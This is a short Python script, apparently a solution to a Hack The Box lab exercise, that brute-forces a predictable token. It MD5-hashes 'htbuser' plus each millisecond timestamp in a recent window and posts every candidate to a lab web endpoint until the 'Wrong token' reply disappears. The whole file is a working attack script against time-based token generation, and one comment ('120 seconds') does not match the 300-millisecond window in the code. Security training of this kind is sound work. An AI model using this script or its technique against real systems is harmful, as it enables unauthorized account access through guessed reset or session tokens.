from hashlib import md5
import requests
from sys import exit
import time
from tqdm import tqdm

url = "http://94.237.55.75:59377/question1/"

# to have a wide window try to bruteforce starting from 120 seconds ago
now        = int(time.time() * 1000)
interval   = 300
start_time = now - interval
fail_text  = "Wrong token"

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, now + 1):
    # get token md5
    token = 'htbuser' + str(x)
    md5_token = md5(token.encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(str(x), md5_token))

    # send the request
    res = requests.post(url, data=data)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()
